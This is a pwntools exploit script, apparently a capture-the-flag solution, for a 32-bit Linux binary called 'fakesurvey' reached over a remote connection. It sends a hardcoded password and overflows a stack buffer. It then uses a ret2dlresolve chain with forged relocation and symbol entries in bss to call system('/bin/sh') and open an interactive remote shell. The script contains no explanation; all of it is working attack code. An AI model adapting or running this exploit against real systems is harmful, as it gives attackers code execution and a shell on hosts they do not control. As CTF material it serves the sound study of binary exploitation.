from pwn import *
from binascii import unhexlify

context.update(arch='i386', endian='little', os='linux')

host = '185.97.118.167'
port = 7050

elf = ELF('./fakesurvey')
# p = elf.process()
p = remote(host, port)
fp = open('payload', 'wb+')

password = b'CPRSyRMOFa3FVIF'
p.sendline(password)
fp.write(password + b'\n')
p.recvuntil(b'competition :)\n')

payload_size = 50
offset = 76

STRTAB 	 		= 0x8048348
SYMTAB 	 		= 0x8048248
JMPREL 	 		= 0x8048454
bss 	 		= 0x804ce00
read_plt 		= 0x8049100
resolver_setup 	= 0x8049030
pop3 			= 0x8049711

rel_offset = bss - JMPREL
binsh_addr = bss + 31

# Payload 1
# read into the writable bss segment
payload = b'A' * offset
payload += p32(read_plt)
payload += p32(pop3)
payload += p32(0x0)
payload += p32(bss)
payload += p32(payload_size)
payload += p32(resolver_setup)
payload += p32(rel_offset)			
payload += p32(0xdeadbeef)			# junk return address
payload += p32(binsh_addr)			# when system is called argument should be top of stack
payload += b'A' * (200 - len(payload))

p.send(payload)
fp.write(payload)

system = b'system\x00'
binsh = b'/bin/sh\x00'

elf_sym = bss + 0x8
align = (0x10 - (elf_sym - SYMTAB) % 0x10) % 0x10
elf_sym += align
sym_index = (elf_sym - SYMTAB) // 0x10
str_offset = (elf_sym + 0x10) - STRTAB
r_info = (sym_index << 8) | 0x7
elf_rel_struct = p32(elf.got['setbuf']) + p32(r_info)
elf_sym_struct = p32(str_offset) + p32(0x1)*3

payload = elf_rel_struct
payload += b'A' * align
payload += elf_sym_struct
payload += system
print(len(payload))
binsh_addr = bss + len(payload)
payload += binsh

payload += b'A' * (payload_size - len(payload))

fp.write(payload)
p.send(payload)

fp.close()

p.interactive()

